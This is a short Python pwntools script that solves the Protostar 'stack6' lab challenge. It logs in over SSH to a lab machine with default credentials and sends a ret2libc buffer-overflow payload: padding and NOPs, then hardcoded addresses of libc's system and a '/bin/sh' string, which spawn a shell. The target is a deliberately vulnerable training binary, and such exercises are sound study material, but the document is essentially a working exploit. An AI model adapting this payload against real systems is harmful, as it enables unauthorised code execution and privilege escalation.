#!/usr/bin/python3
from pwn import *
# change port for your machine
s = ssh(host='172.16.17.27', user='user', password='user', port=22)
# overflowing the buffer modifies the stack
# address of system:
system = '\\xb0\\xff\\xec\\xb7'
# now to call /bin/sh after system we use by calling strings on libc
# we find an address with /bin/sh via grep
# gdb info proc mappings tells us the address of libc is 0xb7e97000
binsh = '\xbfc\xfb\xb7'
exploit = '( python -c \'print "a"*64+"\x90"*12+"'
exploit += system+'"+"'+binsh+'"'
exploit += '\'; cat ) | /opt/protostar/bin/stack6; whoami'
log.info(s[exploit])
